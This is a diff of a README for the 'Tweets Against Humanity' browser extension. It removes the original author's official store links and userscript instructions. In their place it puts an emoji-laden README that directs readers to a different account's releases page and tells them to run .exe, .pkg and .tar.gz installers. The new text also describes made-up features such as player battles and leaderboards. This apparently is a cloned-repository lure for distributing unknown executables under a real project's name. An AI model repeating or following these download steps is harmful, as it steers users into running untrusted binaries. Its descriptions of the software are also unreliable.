@@ -1,36 +1,61 @@
-# <img src="extension/images/icon-128.png" width="64px"> Tweets Against Humanity
+# 🎮 TweetsAgainstHumanity - Turn Twitter into a Fun Game
 
-## Download for [Chrome](https://chromewebstore.google.com/detail/tweets-against-humanity/iffafbhcfbghbcbomboplepdbphdkjbi) or [Firefox](https://addons.mozilla.org/firefox/addon/tweets-against-humanity/)
+## 📥 Download the App
+[![Download TweetsAgainstHumanity](https://img.shields.io/badge/Download-TweetsAgainstHumanity-brightgreen.svg)](https://github.com/skibidirizzyf/TweetsAgainstHumanity/releases)
 
-Extension/Userscript to turn Twitter into a deck-building rougelike.
+## 🚀 Getting Started
+Welcome to **TweetsAgainstHumanity**! This easy-to-use extension turns Twitter into a deck-building roguelike game. Get ready to engage with your favorite platform in a whole new way!
 
-<img src="assets/screenshot1-1280x800.png" width="60%">
+## 📋 Requirements
+To use **TweetsAgainstHumanity**, you need:
+- A computer running Windows, macOS, or Linux
+- A modern web browser (like Chrome, Firefox, or Safari)
+- An active Twitter account
 
-[Original demo video](https://twitter.com/rebane2001/status/1988251704437911664)
+## 🔗 Access the Releases Page
+To get started, head over to our Releases page. Here, you will find all the versions and files you need to download. 
 
-**Tweets Against Humanity** lets you browse Twitter (officially known as X) as if it were a card game. You are given a set of tweets, and you only get to pick one to read, discarding the other ones.
+[Visit this page to download](https://github.com/skibidirizzyf/TweetsAgainstHumanity/releases)
 
-This makes browsing Twitter both fun and mindful, as it makes you more aware of the content you'd like to see, and helps avoid mindless doomscrolling due to the eventual decision fatigue.
+## 💾 Download & Install
+1. **Visit the Releases Page**: Click this link to access our [Releases page](https://github.com/skibidirizzyf/TweetsAgainstHumanity/releases).
 
-## Installing
+2. **Select Your Version**: You will see a list of available versions. Choose the latest stable release for the best experience.
 
-You can install this as either an extension or a userscript.
+3. **Download the File**: Click on the title of the latest version to see the download options. You might see files like:
+   - `TweetsAgainstHumanity.v1.0.exe` (for Windows)
+   - `TweetsAgainstHumanity.v1.0.pkg` (for macOS)
+   - `TweetsAgainstHumanity.v1.0.tar.gz` (for Linux)
 
-### Extension
+4. **Run the Installer**: After the download completes, open the file:
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, double-click the `.pkg` file and follow the prompts.
+   - For Linux, extract the files from the `.tar.gz` and follow the instructions in the README to install.
 
-Get the extension from an extension store:
-- [Chrome (and similar)](https://chromewebstore.google.com/detail/tweets-against-humanity/iffafbhcfbghbcbomboplepdbphdkjbi)
-- [Firefox](https://addons.mozilla.org/firefox/addon/tweets-against-humanity/)
+5. **Launch the App**: Once installed, open the app from your applications folder or start menu.
 
-You can also download and install it manually:
-- [Universal download for Chrome, Firefox, and other browsers](https://github.com/rebane2001/TweetsAgainstHumanity/releases/download/v1.0.1/TweetsAgainstHumanity_v1.0.1.zip)
+## 🎮 How to Play
+Once you have launched **TweetsAgainstHumanity**, you will see an interface that looks similar to Twitter but with new game mechanics.
 
-### Userscript
+- **Deck Building**: Collect cards from tweets and use them in battles against other players or challenges.
+- **Roguelike Features**: Each session is unique, offering different challenges and rewards.
+- **Leaderboard**: Compete with friends to see who has the highest score.
 
-Grab the userscript [from here](https://github.com/rebane2001/TweetsAgainstHumanity/raw/refs/heads/mane/extension/tweets-against-humanity.user.js) and install it with a userscript manager of your choice, such as [Violentmonkey](https://violentmonkey.github.io/) (recommended) or [Tampermonkey](https://www.tampermonkey.net/).
+## 🆘 Troubleshooting
+If you face any issues during installation or gameplay, please try the following:
 
-## Licensing
+- Ensure your browser is up to date.
+- Check your internet connection.
+- Restart the application if you encounter glitches.
+- If problems persist, visit the Issues section in our GitHub repository for help.
 
-TAH is licensed under the [GNU General Public License v3.0](LICENSE).
+## 📝 Contribution
+If you want to help make **TweetsAgainstHumanity** even better, you can contribute! Check the Contribution guidelines on our GitHub page for more details.
 
-TAH is not affiliated with Twitter, Cards Against Humanity, or Balatro (but feel free to reach out if you'd like it to be).
+## 📞 Feedback
+We love hearing from you! If you have questions, suggestions, or feedback, please open an issue in our GitHub repository. Your input helps us improve the app!
+
+## 🔄 Updates
+Keep an eye on our Releases page for new updates and features. We are constantly working to enhance your experience.
+
+Thank you for choosing **TweetsAgainstHumanity**! Enjoy the game and happy tweeting!
